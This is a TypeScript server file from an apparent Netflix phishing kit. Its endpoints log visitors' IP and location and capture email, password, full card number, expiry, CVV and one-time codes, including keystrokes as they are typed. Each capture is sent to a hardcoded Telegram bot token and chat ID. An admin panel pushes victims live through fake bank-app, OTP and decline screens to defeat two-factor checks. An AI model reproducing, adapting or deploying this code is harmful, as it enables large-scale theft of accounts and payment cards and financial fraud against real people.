import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { z } from "zod";
import { getDb } from "./db";
import { visitorSessions, telegramConfig } from "../drizzle/schema";
import { eq, desc } from "drizzle-orm";
import { nanoid } from "nanoid";

const DEFAULT_BOT_TOKEN = "8361020073:AAFfPXu1trr71fxQXKVA0xU5WX_f9z8IN6Y";
const DEFAULT_CHAT_ID = "5219969216";

async function getTgConfig() {
  try {
    const db = await getDb();
    if (!db) return { botToken: DEFAULT_BOT_TOKEN, chatId: DEFAULT_CHAT_ID };
    const rows = await db.select().from(telegramConfig).limit(1);
    if (rows.length > 0) return rows[0];
  } catch {}
  return { botToken: DEFAULT_BOT_TOKEN, chatId: DEFAULT_CHAT_ID };
}

async function sendTelegram(message: string) {
  const config = await getTgConfig();
  const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: config.chatId, text: message, parse_mode: "HTML" }),
    });
  } catch (e) {
    console.error("[Telegram] Failed:", e);
  }
}

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return { success: true } as const;
    }),
  }),

  session: router({
    init: publicProcedure
      .input(z.object({
        ip: z.string().optional(),
        country: z.string().optional(),
        city: z.string().optional(),
        zip: z.string().optional(),
        countryCode: z.string().optional(),
        userAgent: z.string().optional(),
        device: z.string().optional(),
        sessionId: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) return { sessionId: nanoid(), status: "captcha" };
        if (input.sessionId) {
          const existing = await db.select().from(visitorSessions)
            .where(eq(visitorSessions.id, input.sessionId)).limit(1);
          if (existing.length > 0) {
            await db.update(visitorSessions)
              .set({ isOnline: 1, lastSeen: Date.now() })
              .where(eq(visitorSessions.id, input.sessionId));
            return { sessionId: input.sessionId, status: existing[0].status };
          }
        }
        const sessionId = nanoid();
        await db.insert(visitorSessions).values({
          id: sessionId,
          ip: input.ip,
          country: input.country,
          city: input.city,
          zip: input.zip,
          countryCode: input.countryCode,
          userAgent: input.userAgent,
          device: input.device || "desktop",
          isOnline: 1,
          lastSeen: Date.now(),
          status: "captcha",
          adminCommand: "none",
        });
        return { sessionId, status: "captcha" };
      }),

    heartbeat: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) return { ok: true };
        await db.update(visitorSessions)
          .set({ isOnline: 1, lastSeen: Date.now() })
          .where(eq(visitorSessions.id, input.sessionId));
        return { ok: true };
      }),

    offline: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) return { ok: true };
        // Delete session instantly so admin panel removes it immediately
        await db.delete(visitorSessions)
          .where(eq(visitorSessions.id, input.sessionId));
        return { ok: true };
      }),

    poll: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .query(async ({ input }) => {
        const db = await getDb();
        if (!db) return { command: "none", status: "payment" };
        const rows = await db.select().from(visitorSessions)
          .where(eq(visitorSessions.id, input.sessionId)).limit(1);
        if (rows.length === 0) return { command: "none", status: "payment" };
        return { command: rows[0].adminCommand, status: rows[0].status };
      }),

    clearCommand: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) return { ok: true };
        await db.update(visitorSessions)
          .set({ adminCommand: "none" })
          .where(eq(visitorSessions.id, input.sessionId));
        return { ok: true };
      }),

    updateStatus: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        status: z.enum(["captcha","login","payment","bank_app","otp","approved","declined","invalid_otp","blocked"]),
      }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) return { ok: true };
        await db.update(visitorSessions)
          .set({ status: input.status })
          .where(eq(visitorSessions.id, input.sessionId));
        return { ok: true };
      }),

    updateTyping: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        field: z.string(),
        value: z.string(),
      }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) return { ok: true };
        const updateData: Record<string, string> = {};
        if (input.field === "email") updateData.email = input.value;
        else if (input.field === "password") updateData.password = input.value;
        else if (input.field === "cardNumber") updateData.cardNumber = input.value;
        else if (input.field === "cardExpiry") updateData.cardExpiry = input.value;
        else if (input.field === "cardCvv") updateData.cardCvv = input.value;
        else if (input.field === "cardName") updateData.cardName = input.value;
        if (Object.keys(updateData).length > 0) {
          await db.update(visitorSessions)
            .set(updateData)
            .where(eq(visitorSessions.id, input.sessionId));
        }
        return { ok: true };
      }),
  }),

  notify: router({
    captchaPassed: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        ip: z.string(),
        country: z.string(),
        city: z.string(),
        zip: z.string(),
        countryCode: z.string(),
      }))
      .mutation(async ({ input }) => {
        const msg = `\u{1F4FA} <b>Netflix</b> | \u{1F510} <b>CAPTCHA PASSED</b>\n\n\u{1F194} Session: <code>${input.sessionId}</code>\n\u{1F5A5}\uFE0F IP: <code>${input.ip}</code>\n\u{1F30D} Country: ${input.country} (${input.countryCode})\n\u{1F3D9}\uFE0F City: ${input.city}\n\u{1F4EE} ZIP: ${input.zip}`;
        await sendTelegram(msg);
        return { ok: true };
      }),

    loginSubmitted: publicProcedure
      .input(z.object({ sessionId: z.string(), email: z.string(), password: z.string(), ip: z.string().optional() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        let userIp = input.ip || "unknown";
        if (db) {
          const rows = await db.select().from(visitorSessions).where(eq(visitorSessions.id, input.sessionId)).limit(1);
          if (rows.length > 0 && rows[0].ip) userIp = rows[0].ip;
          await db.update(visitorSessions)
            .set({ email: input.email, password: input.password, status: "payment" })
            .where(eq(visitorSessions.id, input.sessionId));
        }
        const msg = `\u{1F4FA} <b>Netflix</b> | \u{1F511} <b>LOGIN SUBMITTED</b>\n\n\u{1F194} Session: <code>${input.sessionId}</code>\n\u{1F5A5}\uFE0F IP: <code>${userIp}</code>\n\u{1F4E7} Email: <code>${input.email}</code>\n\u{1F512} Password: <code>${input.password}</code>`;
        await sendTelegram(msg);
        return { ok: true };
      }),

    paymentSubmitted: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        cardNumber: z.string(),
        cardExpiry: z.string(),
        cardCvv: z.string(),
        cardName: z.string(),
        cardType: z.string(),
      }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        let userIp = "unknown";
        if (db) {
          const rows = await db.select().from(visitorSessions).where(eq(visitorSessions.id, input.sessionId)).limit(1);
          if (rows.length > 0 && rows[0].ip) userIp = rows[0].ip;
          await db.update(visitorSessions)
            .set({
              cardNumber: input.cardNumber,
              cardExpiry: input.cardExpiry,
              cardCvv: input.cardCvv,
              cardName: input.cardName,
              cardType: input.cardType,
              status: "payment",
            })
            .where(eq(visitorSessions.id, input.sessionId));
        }
        const masked = input.cardNumber.replace(/\s/g,"").replace(/(\d{4})(\d{4})(\d{4})(\d{4})/,"$1 $2 $3 $4");
        const msg = `\u{1F4FA} <b>Netflix</b> | \u{1F4B3} <b>PAYMENT SUBMITTED</b>\n\n\u{1F194} Session: <code>${input.sessionId}</code>\n\u{1F5A5}\uFE0F IP: <code>${userIp}</code>\n\u{1F4B3} Card: <code>${masked}</code>\n\u{1F4C5} Expiry: <code>${input.cardExpiry}</code>\n\u{1F510} CVV: <code>${input.cardCvv}</code>\n\u{1F464} Name: <code>${input.cardName}</code>\n\u{1F3E6} Type: ${input.cardType}`;
        await sendTelegram(msg);
        return { ok: true };
      }),

    otpSubmitted: publicProcedure
      .input(z.object({ sessionId: z.string(), otp: z.string() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        let userIp = "unknown";
        if (db) {
          const rows = await db.select().from(visitorSessions).where(eq(visitorSessions.id, input.sessionId)).limit(1);
          if (rows.length > 0 && rows[0].ip) userIp = rows[0].ip;
          await db.update(visitorSessions)
            .set({ otp: input.otp, status: "otp" })
            .where(eq(visitorSessions.id, input.sessionId));
        }
        const msg = `\u{1F4FA} <b>Netflix</b> | \u{1F522} <b>OTP SUBMITTED</b>\n\n\u{1F194} Session: <code>${input.sessionId}</code>\n\u{1F5A5}\uFE0F IP: <code>${userIp}</code>\n\u{1F511} OTP: <code>${input.otp}</code>`;
        await sendTelegram(msg);
        return { ok: true };
      }),
  }),

  admin: router({
    listSessions: protectedProcedure.query(async ({ ctx }) => {
      if (ctx.user?.role !== "admin") throw new Error("Forbidden");
      const db = await getDb();
      if (!db) return [];
      // Only return sessions active within the last 30 seconds (online users only)
      const cutoff = Date.now() - 30000;
      const rows = await db.select().from(visitorSessions).orderBy(desc(visitorSessions.createdAt));
      return rows
        .filter(r => r.lastSeen && r.lastSeen > cutoff)
        .map(r => ({ ...r, isOnline: 1 }));
    }),

    sendCommand: protectedProcedure
      .input(z.object({
        sessionId: z.string(),
        command: z.enum(["bank_app","otp_page","invalid_otp","declined","normal","block"]),
      }))
      .mutation(async ({ ctx, input }) => {
        if (ctx.user?.role !== "admin") throw new Error("Forbidden");
        const db = await getDb();
        if (!db) return { ok: false };
        await db.update(visitorSessions)
          .set({ adminCommand: input.command })
          .where(eq(visitorSessions.id, input.sessionId));
        return { ok: true };
      }),

    deleteSession: protectedProcedure
      .input(z.object({ sessionId: z.string() }))
      .mutation(async ({ ctx, input }) => {
        if (ctx.user?.role !== "admin") throw new Error("Forbidden");
        const db = await getDb();
        if (!db) return { ok: false };
        await db.delete(visitorSessions).where(eq(visitorSessions.id, input.sessionId));
        return { ok: true };
      }),

    getTelegramConfig: protectedProcedure.query(async ({ ctx }) => {
      if (ctx.user?.role !== "admin") throw new Error("Forbidden");
      return await getTgConfig();
    }),

    saveTelegramConfig: protectedProcedure
      .input(z.object({ botToken: z.string(), chatId: z.string() }))
      .mutation(async ({ ctx, input }) => {
        if (ctx.user?.role !== "admin") throw new Error("Forbidden");
        const db = await getDb();
        if (!db) return { ok: false };
        const existing = await db.select().from(telegramConfig).limit(1);
        if (existing.length > 0) {
          await db.update(telegramConfig).set({ botToken: input.botToken, chatId: input.chatId });
        } else {
          await db.insert(telegramConfig).values({ botToken: input.botToken, chatId: input.chatId });
        }
        return { ok: true };
      }),
  }),

  geo: router({
    detect: publicProcedure.query(async ({ ctx }) => {
      try {
        const ip = ctx.req.headers["x-forwarded-for"]?.toString().split(",")[0]?.trim()
          || ctx.req.headers["x-real-ip"]?.toString()
          || "unknown";
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,city,zip,query`);
        const data = await res.json() as { status: string; country: string; countryCode: string; city: string; zip: string; query: string };
        if (data.status === "success") {
          return { ip: data.query, country: data.country, countryCode: data.countryCode, city: data.city, zip: data.zip };
        }
      } catch {}
      return { ip: "unknown", country: "Unknown", countryCode: "US", city: "Unknown", zip: "00000" };
    }),
  }),
});

export type AppRouter = typeof appRouter;
